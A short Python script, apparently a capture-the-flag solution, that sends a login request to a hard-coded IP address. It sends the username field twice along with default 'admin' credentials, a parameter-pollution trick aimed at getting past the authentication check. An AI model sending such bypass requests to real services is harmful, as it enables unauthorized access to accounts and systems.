import requests


URL ="http://20.115.83.90:1338/"

def login():
    data = [('username', 'admin'), ('password', 'admin'),('login-submit', '1'),('username','test')]

    r = requests.post(URL, data=data)

    print(r.content)


login()
